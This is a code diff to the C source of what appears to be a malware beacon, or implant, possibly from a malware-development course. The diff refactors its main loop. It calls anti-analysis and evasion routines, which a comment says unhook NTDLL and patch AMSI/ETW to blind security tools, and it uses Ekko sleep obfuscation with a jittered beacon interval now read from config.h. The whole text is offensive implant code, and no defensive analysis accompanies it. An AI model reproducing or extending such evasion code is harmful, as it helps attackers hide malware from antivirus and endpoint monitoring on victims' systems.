@@ -2,6 +2,7 @@
 #include "anti_analysis.h"
 #include "beacon.h"
 #include "comms.h"
+#include "config.h"
 #include "evasion.h"
 #include "killswitch.h"
 #include "recon.h"
@@ -11,9 +12,7 @@
 VOID beacon_run() {
     printf("[*] beacon_run() starting\n");
 
-    // 1 -- unhook NTDLL (evasion.c, Mod 83/84)
-    if (!unhook_ntdll())
-        printf("[!] NTDLL unhook failed -- continuing\n");
+    // 1 -- evasion: unhook NTDLL, patch AMSI/ETW (evasion.c)
     anti_analysis_run();
     if(!evasion_run())
     {
@@ -55,8 +54,8 @@ VOID beacon_run() {
             HeapFree(GetProcessHeap(), 0, taskBlob);
         }
 
-        // sleep with Ekko obfuscation + jitter
-        ekko_sleep(jitter(30000)); // 30s base
+        // sleep with Ekko obfuscation + jitter (interval from config.h)
+        ekko_sleep(jitter(SLEEP_INTERVAL_MS));
     }
 }
 
